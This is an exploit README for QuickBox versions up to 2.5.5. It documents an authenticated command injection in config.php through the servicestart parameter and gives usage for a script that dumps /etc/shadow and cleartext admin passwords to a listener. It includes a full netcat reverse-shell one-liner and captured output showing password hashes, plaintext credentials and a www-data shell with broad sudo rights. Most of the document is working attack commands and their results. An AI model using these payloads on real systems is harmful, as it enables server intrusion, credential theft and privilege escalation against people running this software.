# QuickBox <= 2.5.5 Authenticated RCE/Privilege escalation
An authenticated non-admin user can execute code on the server by exploiting a command injection vulnerability in config.php 
By sending a GET request with the following parameters you can execute code as www-data: `/inc/config.php?id=88&servicestart=a;<SHELL COMMAND>;` 

This means that a user, who is supposed to be in a jailed shell, can escape this shell and escalate privileges to root by dumping the cleartext password of an admin user.

## Usage
```./QuickBox-2.5.5-Authenticated-RCE.py
usage: QuickBox-2.5.5-Authenticated-RCE.py [-h] -i IP -u USERNAME -p PASSWORD [-l LHOST] [-c CMD]

Authenticated RCE for QuickBox <= v2.5.5

optional arguments:
  -h, --help   show this help message and exit
  -i IP        IP address of the QuickBox dashboard
  -u USERNAME  Username
  -p PASSWORD  Password
  -l LHOST     IP address to receive data on (if not using own listener)
  -c CMD       Command to execute. Default is to dump /etc/shadow and cleartext passwords
  ```
  
 ## Examples
 ### Dump hashes and password
 ```
 ./QuickBox-2.5.5-Authenticated-RCE.py -i 192.168.1.250 -u s1gh2 -p Password1234 -l 192.168.1.126
[*] Starting listener for incoming response...
[*] Sending our payload...
[*] Got a response!

root:<REDACTED>:18406:0:99999:7:::
daemon:*:17920:0:99999:7:::
bin:*:17920:0:99999:7:::
sys:*:17920:0:99999:7:::
sync:*:17920:0:99999:7:::
games:*:17920:0:99999:7:::
man:*:17920:0:99999:7:::
lp:*:17920:0:99999:7:::
mail:*:17920:0:99999:7:::
news:*:17920:0:99999:7:::
uucp:*:17920:0:99999:7:::
proxy:*:17920:0:99999:7:::
www-data:*:17920:0:99999:7:::
backup:*:17920:0:99999:7:::
list:*:17920:0:99999:7:::
irc:*:17920:0:99999:7:::
gnats:*:17920:0:99999:7:::
nobody:*:17920:0:99999:7:::
systemd-timesync:*:17920:0:99999:7:::
systemd-network:*:17920:0:99999:7:::
systemd-resolve:*:17920:0:99999:7:::
systemd-bus-proxy:*:17920:0:99999:7:::
syslog:*:17920:0:99999:7:::
_apt:*:17920:0:99999:7:::
postfix:*:17920:0:99999:7:::
sshd:*:17920:0:99999:7:::
uuidd:*:17920:0:99999:7:::
messagebus:*:17920:0:99999:7:::
s1gh:$6$hf2vF79G$APAqRRKp4Jax27xzZE1npHlumLWaDsgaHo3z/Sw6Z3tEnemam9h.EB1pXFx1Jy9mZ/jqaQoTBlL7TphlAZb210:18406:0:99999:7:::
memcache:!:18406:0:99999:7:::
vnstat:*:18406:0:99999:7:::
debian-deluged:*:18406:0:99999:7:::
ftp:*:18406:0:99999:7:::
shellinabox:*:18406:0:99999:7:::
test:$6$qPhsfmxz$Jm529ZLBiigWAhcRO3svLm4HLRFZsYgkWso0dTa2d6Bxb8UJd6LuCI1AVaOutXVheu2Z2iWugRQFQLeZGCecp.:18406:0:99999:7:::
s1gh2:$6$zaGzrHfj$1Qgs5AWlruq2YJpPFs6TjO2QNtd.WpiAV7WMV9aQE1nJKAC1LdYTh/52/HkvBeYkBhzob/E1q6JwJp6zKGRHx.:18406:0:99999:7:::


/root/s1gh2.info.db:s1gh2:Password1234
/root/test.info.db:test:test
/root/s1gh.info.db:s1gh:Password1234
```
### Reverse shell
```
./QuickBox-2.5.5-Authenticated-RCE.py -i 192.168.1.250 -u s1gh2 -p Password1234 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.126 9001 >/tmp/f'
[*] Sending our payload...
```

```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.126] from (UNKNOWN) [192.168.1.250] 36796
/bin/sh: 0: can't access tty; job control turned off
$ whoami;id;sudo -l
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(s1gh),1001(test),1002(s1gh2)
Matching Defaults entries for www-data on Ubuntu1604.local:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/usr/local/bin/quickbox\:/usr/local/bin/quickbox/system\:/usr/local/bin/quickbox/package\:/usr/local/bin/quickbox/package/install\:/usr/local/bin/quickbox/package/remove\:/usr/local/bin/quickbox/plugin\:/usr/local/bin/quickbox/plugin/install\:/usr/local/bin/quickbox/plugin/remove, env_keep-=HOME

User www-data may run the following commands on Ubuntu1604.local:
    (ALL) NOPASSWD: /usr/local/bin/quickbox/system/clean_mem, /proc/sys/vm/drop_caches, /usr/local/bin/quickbox/system/clean_log, /usr/local/bin/quickbox/system/set_interface, /usr/local/bin/quickbox/system/setdisk, /usr/local/bin/quickbox/system/showspace, /usr/local/bin/quickbox/system/updateQuickBox, /usr/local/bin/quickbox/system/lang/langSelect-*, /usr/local/bin/quickbox/system/theme/themeSelect-*, /usr/local/bin/quickbox/system/install_ffmpeg, /usr/local/bin/quickbox/system/quickVPN, /usr/local/bin/quickbox/system/box, /usr/local/bin/quickbox/plugin/install/installplugin-*, /usr/local/bin/quickbox/plugin/remove/removeplugin-*, /usr/local/bin/quickbox/package/install/installpackage-*, /usr/local/bin/quickbox/package/remove/removepackage-*, /usr/bin/ifstat, /usr/bin/vnstat, /usr/sbin/repquota, /bin/grep, /usr/bin/reload, /etc/init.d/apache2 restart, /usr/bin/pkill, /usr/bin/killall, /bin/systemctl
